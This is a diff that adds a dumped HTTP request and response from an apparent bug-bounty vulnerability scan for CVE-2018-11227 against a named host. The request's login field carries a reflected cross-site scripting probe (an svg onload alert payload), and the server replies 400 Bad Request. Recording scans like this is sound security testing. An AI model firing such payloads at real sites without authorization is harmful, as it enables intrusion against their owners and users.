@@ -1,0 +1,25 @@
+[CVE-2018-11227] Dumped HTTP request for https://techsolutions.bitpanda.com/admin/index.php?id=pages
+
+
+POST /admin/index.php?id=pages HTTP/1.1
+Host: techsolutions.bitpanda.com
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36
+Connection: close
+Content-Length: 79
+Content-Type: application/x-www-form-urlencoded
+X-Bug-Bounty: Bugcrowd-eno@bugcrowdninja.com
+Accept-Encoding: gzip
+
+login="><svg/onload=alert(document.domain)>&password=xxxxxx&login_submit=Log+In
+[CVE-2018-11227] Dumped HTTP response https://techsolutions.bitpanda.com/admin/index.php?id=pages
+
+HTTP/1.1 400 Bad Request
+Connection: close
+Content-Length: 11
+Date: Tue, 05 Aug 2025 12:53:22 GMT
+Via: 1.1 453fca9bdf51d1b9cd544a035e75d92c.cloudfront.net (CloudFront)
+X-Amz-Cf-Id: lne4PQudXQyB24L3Jhgw2cySAAUG6HMPmbXfWCz0BhunbBHdes-x_A==
+X-Amz-Cf-Pop: IAD55-P8
+X-Cache: LambdaGeneratedResponse from cloudfront
+
+Bad Request
